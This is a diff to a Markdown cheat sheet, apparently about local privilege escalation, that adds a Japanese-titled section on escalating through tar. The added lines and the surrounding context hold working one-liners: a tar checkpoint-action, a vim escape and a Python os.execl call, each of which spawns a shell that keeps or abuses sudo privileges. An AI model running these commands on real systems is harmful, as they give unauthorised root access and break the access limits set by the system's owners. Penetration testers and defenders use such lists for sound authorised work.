@@ -35,3 +35,9 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```bash
 sudo vim -c ':!/bin/sh'
 ```
+
+## tar で昇格
+
+```bash
+sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
